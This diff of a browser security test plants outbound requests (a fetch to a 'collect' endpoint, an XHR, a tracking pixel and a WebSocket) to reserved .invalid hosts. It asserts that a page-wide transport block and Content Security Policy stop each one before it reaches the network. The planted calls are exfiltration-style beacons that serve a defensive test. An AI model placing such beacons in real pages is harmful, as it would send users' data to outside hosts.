@@ -144,7 +144,10 @@ try {
     await composer(page).waitFor({ timeout: 20000 });
     const planted = await page.evaluate(async () => {
       const outcome = {};
+      // fetch is the synthetic transport for the whole page (first layer); XHR is left to CSP (second layer).
       try { await fetch('https://planted-exfiltration.invalid/collect'); outcome.fetch = 'sent'; } catch { outcome.fetch = 'blocked'; }
+      outcome.transportBlocked = [...(window.__qaBlockedHosts || [])];
+      await new Promise((r) => { const x = new XMLHttpRequest(); x.onloadend = r; x.open('GET', 'https://planted-xhr.invalid/x'); try { x.send(); } catch { r(); } });
       new Image().src = 'https://planted-pixel.invalid/p.png';
       // CSP refuses the connection asynchronously; the constructor itself does not throw.
       try { new WebSocket('wss://planted-socket.invalid/'); outcome.socket = 'constructed'; } catch { outcome.socket = 'blocked'; }
@@ -153,6 +156,7 @@ try {
       return { ...outcome, csp: window.__cspViolations.map((v) => v.directive) };
     });
     assert.equal(planted.fetch, 'blocked');
+    assert.ok(planted.transportBlocked.includes('planted-exfiltration.invalid'), 'the page-wide transport refused the planted fetch');
     assert.notEqual(planted.sw, 'registered');
     assert.ok(planted.csp.filter((d) => d === 'connect-src').length >= 2 && planted.csp.includes('img-src'), `CSP reported the planted fetch, socket and image: ${planted.csp}`);
     assert.deepEqual(seen.external, [], 'CSP stopped planted requests before the network');
